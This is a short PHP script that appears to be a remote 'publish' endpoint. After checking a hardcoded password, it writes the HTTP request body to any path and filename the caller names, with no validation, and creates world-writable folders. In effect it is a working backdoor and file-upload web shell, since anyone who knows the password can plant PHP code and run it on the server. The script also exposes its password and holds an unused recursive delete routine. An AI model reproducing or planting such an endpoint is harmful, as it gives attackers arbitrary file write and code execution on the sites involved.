<?php
header("Content-Type: text/html; charset=utf-8");
$action=$_REQUEST['action'];
$password=$_REQUEST['password'];
$pathname=$_REQUEST['pathname'];
$keywordindex=$_REQUEST['keywordindex'];
$filename=$_REQUEST['filename'];
$body=stripslashes($_REQUEST['body']);

if($action=="test")
{
    echo 'test success';
    return;
}

if($action!="publish")
{
    echo 'action error';
    return;
}

if($action==""||$password==""||$filename==""||$body=="")
{
    echo 'parameters error';
    return;
}

if($password!="V.lenovoE125")
{
    echo 'password error';
    return;
}

$wjj=dirname(__FILE__);
if(!file_exists($wjj))
{ 	
    mkdir($wjj,0777);
}
createFolder($pathname);

$fp=fopen($pathname.'/'.$filename,"w");
//fwrite($fp,"\xEF\xBB\xBF".iconv('gbk','utf-8//IGNORE',$body));
fwrite($fp,"\xEF\xBB\xBF".$body);
fclose($fp);
echo "publish success";

function createFolder($path) 
{
    if (!file_exists($path))
    {
        createFolder(dirname($path));
        mkdir($path, 0777);
    }
}
 
function mkdirs($dir)  
{ 
    if(!is_dir($dir))  
    {  
        if(!mkdirs(dirname($dir)))
        {  return false;  }  
        if(!mkdir($dir,0777))
        {  return false;  }
    } 
    return true;  
}  

function rmdirs($dir)  
{  
    $d = dir($dir); 
    while (false !== ($child = $d->read()))
    {  
        if($child != '.' && $child != '..')
        {  
            if(is_dir($dir.'/'.$child))  
                rmdirs($dir.'/'.$child);  
            else 
                unlink($dir.'/'.$child); 
        }
    }  
    $d->close();  
    rmdir($dir);  
} 


?>